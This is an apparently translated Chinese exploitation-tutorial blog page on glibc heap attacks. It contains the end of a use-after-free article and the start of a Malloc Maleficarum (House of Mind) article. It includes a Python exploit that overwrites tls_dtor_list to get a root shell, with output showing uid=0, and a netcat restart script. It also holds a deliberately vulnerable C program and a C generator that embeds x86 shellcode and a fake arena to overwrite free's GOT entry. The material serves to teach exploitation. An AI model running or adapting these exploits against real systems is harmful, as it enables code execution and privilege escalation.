<p>在<a href="http://www.csyssec.org/20170104/heap-offbyone/" target="_blank" rel="external">这里</a>可以看出，如果攻击者成功覆盖下一个chunk的size域，就可以欺骗glibc malloc来unlink chunk ‘p2_1’了，尽管这时chunk已经处于分配状态。在<a href="http://www.csyssec.org/20170104/heap-offbyone/" target="_blank" rel="external">同一篇</a>文中，我们也知道只要攻击者能小心的构造一个假的chunk头部信息，unlink一个已经处于分配状态的大chunk会导致任意代码执行!! 攻击者按一下方式构造假的chunk头部信息：</p>
<ul>
<li>fd必须指回被释放的chunk地址。从堆布局中可以发现，’p2_1’位于偏移0x410处。 因此，fd=heap_base_address(可以从信息泄露bug中获取) + 0x410.</li>
<li>bk也要指回被释放的chunk地址。从堆布局中可以发现，’p2_1’位于偏移0x410处。 因此，fd=heap_base_address(可以从信息泄露bug中获取) + 0x410.</li>
<li>fd_nextsize必须指向tls_dtor_list - 0x14。 ‘tls_dtor_list’属于glibc的私有匿名映射段中，它已经被随机化。因此，可以利用下面的漏洞利用代码中的暴力破解技术绕过随机化。</li>
<li>bk_nextsize必须指向含有dtor_list元素的堆地址！ 在构建假的chunk 头之后，’system’ dtor_list被攻击者注入，这时，’setuid’ dtor_list被攻击者注入来替代’p2_1’的堆内存区域。从堆布局中，我们可以知道’system’ 和’setuid’ dtor_list分别位于0x428和0x618处。</li>
</ul>
<p>得到所有这些信息之后，我们就可以写个漏洞利用程序攻击二进制文件’vuln’了。</p>
<p><u>漏洞利用代码</u>：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">#exp.py</div><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">import sys</div><div class="line">import telnetlib</div><div class="line">import time</div><div class="line"></div><div class="line">ip = '127.0.0.1'</div><div class="line">port = 1234</div><div class="line"></div><div class="line">def conv(num): return struct.pack("&lt;I</div><div class="line">def send(data):</div><div class="line"> global con</div><div class="line"> con.write(data)</div><div class="line"> return con.read_until('\n')</div><div class="line"></div><div class="line">print "** Bruteforcing libc base address**"</div><div class="line">libc_base_addr = 0xb756a000</div><div class="line">fd_nextsize = (libc_base_addr - 0x1000) + 0x6c0</div><div class="line">system = libc_base_addr + 0x3e6e0</div><div class="line">system_arg = 0x80482ae</div><div class="line">size = 0x200</div><div class="line">setuid = libc_base_addr + 0xb9e30</div><div class="line">setuid_arg = 0x0</div><div class="line"></div><div class="line">while True:</div><div class="line"> time.sleep(4)</div><div class="line"> con = telnetlib.Telnet(ip, port)</div><div class="line"> laddress = con.read_until('\n')</div><div class="line"> laddress = laddress[8:12]</div><div class="line"> heap_addr_tup = struct.unpack("&lt;I", laddress)</div><div class="line"> heap_addr = heap_addr_tup[0]</div><div class="line"> print "** Leaked heap addresses : [0x%x] **" %(heap_addr)</div><div class="line"> heap_base_addr = heap_addr - 0x10</div><div class="line"> fd = heap_base_addr + 0x410</div><div class="line"> bk = fd</div><div class="line"> bk_nextsize = heap_base_addr + 0x618</div><div class="line"> mp = heap_base_addr + 0x18</div><div class="line"> nxt = heap_base_addr + 0x428</div><div class="line"></div><div class="line"> print "** Constructing fake chunk to overwrite tls_dtor_list**"</div><div class="line"> fake_chunk = conv(fd)</div><div class="line"> fake_chunk += conv(bk)</div><div class="line"> fake_chunk += conv(fd_nextsize)</div><div class="line"> fake_chunk += conv(bk_nextsize)</div><div class="line"> fake_chunk += conv(system)</div><div class="line"> fake_chunk += conv(system_arg)</div><div class="line"> fake_chunk += "A" * 484</div><div class="line"> fake_chunk += conv(size)</div><div class="line"> fake_chunk += conv(setuid)</div><div class="line"> fake_chunk += conv(setuid_arg)</div><div class="line"> fake_chunk += conv(mp)</div><div class="line"> fake_chunk += conv(nxt)</div><div class="line"> print "** Successful tls_dtor_list overwrite gives us shell!!**"</div><div class="line"> send(fake_chunk)</div><div class="line"></div><div class="line"> try: </div><div class="line">  con.interact()</div><div class="line"> except: </div><div class="line">  exit(0)</div></pre></td></tr></table></figure>
<p>使用暴力破解技术，我们需要尝试许多次来绕过随机化直至成功。我们可以让漏洞程序’vuln’作为网络服务器来运行，然后使用shell脚本保证当系统奔溃时能自动重启。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#vuln.sh</span></div><div class="line">#!/bin/sh</div><div class="line">nc_process_id=$(pidof nc)</div><div class="line"><span class="keyword">while</span> :</div><div class="line"><span class="keyword">do</span></div><div class="line"> <span class="keyword">if</span> [[ -z $nc_process_id ]]; then</div><div class="line"> echo <span class="string">"(Re)starting nc..."</span></div><div class="line"> nc -l -p <span class="number">1234</span> -c <span class="string">"./vuln sploitfun"</span></div><div class="line"> <span class="keyword">else</span></div><div class="line"> echo <span class="string">"nc is running..."</span></div><div class="line"> fi</div><div class="line">done</div></pre></td></tr></table></figure>
<p>执行上述漏洞利用代码可以得到root shell! 太棒了!</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">Shell<span class="number">-1</span>$./vuln.sh</div><div class="line">Shell<span class="number">-2</span>$python <span class="built_in">exp</span>.py</div><div class="line">...</div><div class="line">** Leaked heap addresses : [<span class="number">0x889d010</span>] **</div><div class="line">** Constructing fake chunk to overwrite tls_dtor_list**</div><div class="line">** Successfull tls_dtor_list overwrite gives us shell!!**</div><div class="line">*** Connection closed by remote host ***</div><div class="line">** Leaked heap addresses : [<span class="number">0x895d010</span>] **</div><div class="line">** Constructing fake chunk to overwrite tls_dtor_list**</div><div class="line">** Successfull tls_dtor_list overwrite gives us shell!!**</div><div class="line">*** Connection closed by remote host ***</div><div class="line">id</div><div class="line">uid=<span class="number">0</span>(root) gid=<span class="number">1000</span>(bala) groups=<span class="number">0</span>(root),<span class="number">10</span>(wheel),<span class="number">1000</span>(bala) context=unconfined_u:unconfined_r:<span class="keyword">unconfined_t</span>:s0-s0:c0.c1023</div><div class="line"><span class="built_in">exit</span></div><div class="line">** Leaked heap addresses : [<span class="number">0x890c010</span>] **</div><div class="line">** Constructing fake chunk to overwrite tls_dtor_list**</div><div class="line">** Successfull tls_dtor_list overwrite gives us shell!!**</div><div class="line">*** Connection closed by remote host ***</div><div class="line">...</div><div class="line">$</div></pre></td></tr></table></figure>
<p><u>参考</u>:</p>
<p><a href="http://v0ids3curity.blogspot.in/2015/02/revisiting-defcon-ctf-shitsco-use-after.html" target="_blank" rel="external">1. Revisiting Defcon CTF Shitsco Use-After-Free Vulnerability – Remote Code Execution</a></p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/useafterfree" target="_blank" rel="external">Linux(X86)漏洞利用系列-Use-after-free)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-maleficarum"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170104/maleficarum/">Malloc Maleficarum堆溢出</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170104/maleficarum/" class="article-date">
	  <time datetime="2017-01-04T15:10:09.000Z" itemprop="datePublished">一月 4, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/maleficarum" target="_blank" rel="external">Linux(X86)漏洞利用系列-Malloc Maleficarum堆溢出)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<blockquote>
<ul>
<li>0X01 House of Mind</li>
<li>0X02 House of Force</li>
<li>0x03 House of Spirit</li>
</ul>
</blockquote>
<p><u>阅读基础</u>:</p>
<ul>
<li><ol>
<li><a href="http://www.csyssec.org/20170104/glibcmalloc/" target="_blank" rel="external">深入理解glibc malloc</a></li>
</ol>
</li>
</ul>
<p>在2004后期，’glibc malloc’ 被强化. 像unlink类似的一些技术过时后，攻击者变得无所适从。但仅在2005年后期，’Phantasmal Phatasmagoria’又开始提出下面的一系列技术来成功利用堆溢出。</p>
<ul>
<li>House of Prime</li>
<li>House of Mind </li>
<li>House of Force</li>
<li>House of Lore</li>
<li>House of Spirit</li>
</ul>
<h3 id="0X01-House-of-Mind"><a href="#0X01-House-of-Mind" class="headerlink" title="0X01 House of Mind"></a>0X01 House of Mind</h3><p>通过这项技术，攻击者利用构造的假arena( Fake Arena)来欺骗’glibc malloc’。通过构造假的arena以让未排序bin的fd含有free的GOT表项地址(12)。 如此一来，漏洞程序中释放的free函数的GOT表项被shellcode地址覆盖。成功覆盖GOT之后，任何时候调用漏洞程序的free函数，shellcode就会执行。</p>
<p><u>假设条件</u>: 由于不是所有的堆溢出漏洞程序都能被house of mind技术成功利用，以下是成功利用的假设条件：</p>
<ul>
<li>1.调用一系列malloc，直到一个chunk的地址对其多倍的HEAP_MAX_SIZE，进而生成一块内存区域能被攻击者控制。在这块内存区域里，可以发现假的heap_info结构体。假的heap_info的arena指针ar_ptr将会指向假的arena。这样一来，假的arena和heap_info内存区域都会被攻击者控制。</li>
<li>2.Size域(其arena指针是prereq 1)被攻击者控制的一个chunk必须要释放。</li>
<li><ol>
<li>紧邻上述被释放chunk的下一个chunk不能是一个top chunk.</li>
</ol>
</li>
</ul>
<p><u>漏洞程序</u>：这个漏洞程序满足上述假设条件</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* vuln.c</span></div><div class="line"> House of Mind vulnerable program</div><div class="line"> */</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> *ptr = <span class="built_in">malloc</span>(<span class="number">1024</span>); <span class="comment">/* First allocated chunk */</span></div><div class="line"> <span class="keyword">char</span> *ptr2; <span class="comment">/* Second chunk/Last but one chunk */</span></div><div class="line"> <span class="keyword">char</span> *ptr3; <span class="comment">/* Last chunk */</span></div><div class="line"> <span class="keyword">int</span> heap = (<span class="keyword">int</span>)ptr &amp; <span class="number">0xFFF00000</span>;</div><div class="line"> <span class="keyword">_Bool</span> found = <span class="number">0</span>;</div><div class="line"> <span class="keyword">int</span> i = <span class="number">2</span>;</div><div class="line"></div><div class="line"> <span class="keyword">for</span> (i = <span class="number">2</span>; i &lt; <span class="number">1024</span>; i++) &#123;</div><div class="line">   <span class="comment">/* Prereq 1: Series of malloc calls until a chunk's address - when aligned to HEAP_MAX_SIZE results in 0x08100000 */</span></div><div class="line">   <span class="comment">/* 0x08100000 is the place where fake heap_info structure is found. */</span></div><div class="line">   [<span class="number">1</span>]<span class="keyword">if</span> (!found &amp;&amp; (((<span class="keyword">int</span>)(ptr2 = <span class="built_in">malloc</span>(<span class="number">1024</span>)) &amp; <span class="number">0xFFF00000</span>) == \</div><div class="line">      (heap + <span class="number">0x100000</span>))) &#123;</div><div class="line">     <span class="built_in">printf</span>(<span class="string">"good heap allignment found on malloc() %i (%p)\n"</span>, i, ptr2);</div><div class="line">     found = <span class="number">1</span>;</div><div class="line">     <span class="keyword">break</span>;</div><div class="line">   &#125;</div><div class="line"> &#125;</div><div class="line"> [<span class="number">2</span>]ptr3 = <span class="built_in">malloc</span>(<span class="number">1024</span>); <span class="comment">/* Last chunk. Prereq 3: Next chunk to ptr2 != av-&gt;top */</span></div><div class="line"> <span class="comment">/* User Input. */</span></div><div class="line"> [<span class="number">3</span>]fread (ptr, <span class="number">1024</span> * <span class="number">1024</span>, <span class="number">1</span>, <span class="built_in">stdin</span>);</div><div class="line"></div><div class="line"> [<span class="number">4</span>]<span class="built_in">free</span>(ptr2); <span class="comment">/* Prereq 2: Freeing a chunk whose size and its arena pointer is controlled by the attacker. */</span></div><div class="line"> [<span class="number">5</span>]<span class="built_in">free</span>(ptr3); <span class="comment">/* Shell code execution. */</span></div><div class="line"> <span class="keyword">return</span>(<span class="number">0</span>); <span class="comment">/* Bye */</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上述漏洞程序的堆内存如下所示：</p>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/maleficarum1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/maleficarum1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>


<p><strong>注：本系列所有文章中第[N]行代码指的的代码中显示/*[N]*/的位置。</strong></p>
<p>漏洞程序中的第[3]行就是堆溢出发生的地方。用户输入存储在chunk1的内存指针处，共1MB大小。为了成功利用堆溢出，攻击者要按照以下顺序提供用户输入：</p>
<ul>
<li>Fake arena</li>
<li>Junk</li>
<li>Fake heap_info</li>
<li>Shellcode</li>
</ul>
<p><u>漏洞利用程序</u>：这个程序生成攻击者的数据文件</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* exp.c</span></div><div class="line">Program to generate attacker data.</div><div class="line">Command:</div><div class="line">     #./exp &gt; file</div><div class="line">*/</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> BIN1 0xb7fd8430</span></div><div class="line"></div><div class="line"><span class="keyword">char</span> scode[] =</div><div class="line"><span class="comment">/* Shellcode to execute linux command "id". Size - 72 bytes. */</span></div><div class="line"><span class="string">"\x31\xc9\x83\xe9\xf4\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e"</span></div><div class="line"><span class="string">"\xc9\x6a\x42\x83\xeb\xfc\xe2\xf4\x34\xc2\x32\xdb\x0c\xaf\x02\x6f"</span></div><div class="line"><span class="string">"\x3d\x40\x8d\x2a\x71\xba\x02\x42\x36\xe6\x08\x2b\x30\x40\x89\x10"</span></div><div class="line"><span class="string">"\xb6\xc5\x6a\x42\x5e\xe6\x1f\x31\x2c\xe6\x08\x2b\x30\xe6\x03\x26"</span></div><div class="line"><span class="string">"\x5e\x9e\x39\xcb\xbf\x04\xea\x42"</span>;</div><div class="line"></div><div class="line"><span class="keyword">char</span> ret_str[<span class="number">4</span>] = <span class="string">"\x00\x00\x00\x00"</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">convert_endianess</span><span class="params">(<span class="keyword">int</span> arg)</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line">        ret_str[<span class="number">3</span>] = (arg &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span>;</div><div class="line">        ret_str[<span class="number">2</span>] = (arg &amp; <span class="number">0x00FF0000</span>) &gt;&gt; <span class="number">16</span>;</div><div class="line">        ret_str[<span class="number">1</span>] = (arg &amp; <span class="number">0x0000FF00</span>) &gt;&gt; <span class="number">8</span>;</div><div class="line">        ret_str[<span class="number">0</span>] = (arg &amp; <span class="number">0x000000FF</span>) &gt;&gt; <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</div><div class="line"></div><div class="line">        fwrite(<span class="string">"\x41\x41\x41\x41"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* fd */</span></div><div class="line">        fwrite(<span class="string">"\x41\x41\x41\x41"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bk */</span></div><div class="line">        fwrite(<span class="string">"\x41\x41\x41\x41"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* fd_nextsize */</span></div><div class="line">        fwrite(<span class="string">"\x41\x41\x41\x41"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bk_nextsize */</span></div><div class="line">        <span class="comment">/* Fake Arena. */</span></div><div class="line">        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* mutex */</span></div><div class="line">        fwrite(<span class="string">"\x01\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* flag */</span></div><div class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</div><div class="line">                fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* fastbinsY */</span></div><div class="line">        fwrite(<span class="string">"\xb0\x0e\x10\x08"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* top */</span></div><div class="line">        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* last_remainder */</span></div><div class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">127</span>;i++) &#123;</div><div class="line">                convert_endianess(BIN1+(i*<span class="number">8</span>));</div><div class="line">                <span class="keyword">if</span>(i == <span class="number">119</span>) &#123;</div><div class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* preserve prev_size */</span></div><div class="line">                        fwrite(<span class="string">"\x09\x04\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* preserve size */</span></div><div class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span>(i==<span class="number">0</span>) &#123;</div><div class="line">                        fwrite(<span class="string">"\xe8\x98\x04\x08"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bins[i][0] = (GOT(free) - 12) */</span></div><div class="line">                        fwrite(ret_str, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bins[i][1] */</span></div><div class="line">                &#125;</div><div class="line">                <span class="keyword">else</span> &#123;</div><div class="line">                        fwrite(ret_str, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bins[i][0] */</span></div><div class="line">                        fwrite(ret_str, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bins[i][1] */</span></div><div class="line">                &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</div><div class="line">                fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* binmap[i] */</span></div><div class="line">        &#125;</div><div class="line">        fwrite(<span class="string">"\x00\x84\xfd\xb7"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* next */</span></div><div class="line">        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* next_free */</span></div><div class="line">        fwrite(<span class="string">"\x00\x60\x0c\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* system_mem */</span></div><div class="line">        fwrite(<span class="string">"\x00\x60\x0c\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* max_system_mem */</span></div><div class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">234</span>;i++) &#123;</div><div class="line">                fwrite(<span class="string">"\x41\x41\x41\x41"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* PAD */</span></div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">722</span>;i++) &#123;</div><div class="line">                <span class="keyword">if</span>(i==<span class="number">721</span>) &#123;</div><div class="line">                        <span class="comment">/* Chunk 724 contains the shellcode. */</span></div><div class="line">                        fwrite(<span class="string">"\xeb\x18\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* prev_size  - Jmp 24 bytes */</span></div><div class="line">                        fwrite(<span class="string">"\x0d\x04\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* size */</span></div><div class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* fd */</span></div><div class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bk */</span></div><div class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* fd_nextsize */</span></div><div class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bk_nextsize */</span></div><div class="line">                        fwrite(<span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span> \</div><div class="line">                        <span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="built_in">stdout</span>);  <span class="comment">/* NOPS */</span></div><div class="line">                        fwrite(scode, <span class="keyword">sizeof</span>(scode)<span class="number">-1</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* SHELLCODE */</span></div><div class="line">                        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">230</span>;j++)</div><div class="line">                                fwrite(<span class="string">"\x42\x42\x42\x42"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* PAD */</span></div><div class="line">                        <span class="keyword">continue</span>;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* prev_size */</span></div><div class="line">                        fwrite(<span class="string">"\x09\x04\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* size */</span></div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span>(i==<span class="number">720</span>) &#123;</div><div class="line">                        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">90</span>;j++)</div><div class="line">                                fwrite(<span class="string">"\x42\x42\x42\x42"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* PAD */</span></div><div class="line">                        fwrite(<span class="string">"\x18\xa0\x04\x08"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* Arena Pointer */</span></div><div class="line">                        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">165</span>;j++)</div><div class="line">                                fwrite(<span class="string">"\x42\x42\x42\x42"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* PAD */</span></div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">256</span>;j++)</div><div class="line">                                fwrite(<span class="string">"\x42\x42\x42\x42"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* PAD */</span></div><div class="line">                &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>攻击者生成数据文件作为用户输入，漏洞程序的堆内存变为如下所示：</p>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/maleficarum2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/maleficarum2.png" width="450"></a><br>    <figcaption></figcaption><br></figure>


